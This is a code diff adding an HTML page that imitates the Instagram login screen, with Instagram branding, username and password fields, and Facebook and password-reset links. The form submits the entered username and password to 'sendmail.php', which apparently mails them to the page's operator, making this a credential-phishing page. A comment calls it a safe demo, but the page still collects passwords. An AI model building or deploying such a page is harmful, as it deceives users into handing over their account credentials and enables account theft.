@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="login-container">
+
+    <div class="login-box">
+        <div class="logo">Instagram</div>
+
+        <form action="sendmail.php" method="POST">
+
+            <input type="text"
+                   name="username"
+                   class="input-box"
+                   placeholder="Phone number, username, or email"
+                   required>
+
+            <!-- PROJECT SAFE: password optional / demo -->
+            <input type="password"
+                   name="password"
+                   class="input-box"
+                   placeholder="Password">
+
+            <button type="submit" class="login-btn">
+                Log In
+            </button>
+        </form>
+
+        <div class="or">
+            <span>OR</span>
+        </div>
+
+        <div class="fb-login">
+            Log in with Facebook
+        </div>
+
+        <div class="forgot">
+            Forgot password?
+        </div>
+    </div>
+
+    <div class="signup-box">
+        Don’t have an account?
+        <span>Sign up</span>
+    </div>
+
+</div>
+
+</body>
+</html>
+<link rel="stylesheet" href="style.css">
